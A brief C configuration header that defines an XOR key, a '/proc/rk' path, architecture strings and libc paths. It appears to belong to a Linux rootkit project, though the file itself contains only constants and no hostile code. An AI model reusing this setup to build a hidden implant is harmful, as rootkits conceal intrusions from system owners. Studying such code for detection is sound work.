#ifndef CONFIG_H
#define CONFIG_H

#define XORKEY          (uint32_t)0xdeadbeef;

#define RK_PATH         "/proc/rk"

#ifdef __i386__
#define BUILD_ARCH      "i686"
#define LIBC_PATH       "/lib/i686-linux-gnu/libc.so.6"
#endif

#ifdef __x86_64__
#define BUILD_ARCH      "x86_64"
#define LIBC_PATH       "/lib/x86_64-linux-gnu/libc.so.6"
#endif

#endif /* config.h */
